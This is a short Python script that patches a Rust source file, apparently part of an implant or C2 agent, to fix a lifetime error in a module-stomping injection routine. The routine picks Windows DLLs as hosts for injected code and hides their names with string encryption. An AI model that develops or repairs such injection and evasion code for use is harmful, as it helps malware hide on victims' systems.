import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Fix the lifetime error 
text = text.replace('''            let c1 = enc_str!("msfte.dll");
            let c2 = enc_str!("msratelc.dll");
            let c3 = enc_str!("scrobj.dll");
            let c4 = enc_str!("amstream.dll");
            
            let candidates: Vec<&[u8]> = vec![
                c1.as_ref(),
                c2.as_ref(),
                c3.as_ref(),
                c4.as_ref()
            ];''', '''
            let mut candidates: Vec<Vec<u8>> = vec![
                enc_str!("msfte.dll").to_vec(),
                enc_str!("msratelc.dll").to_vec(),
                enc_str!("scrobj.dll").to_vec(),
                enc_str!("amstream.dll").to_vec()
            ];
''')
text = text.replace('''            let target_dll = &candidates[0];''', '''            let target_dll = candidates[0].as_slice();''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

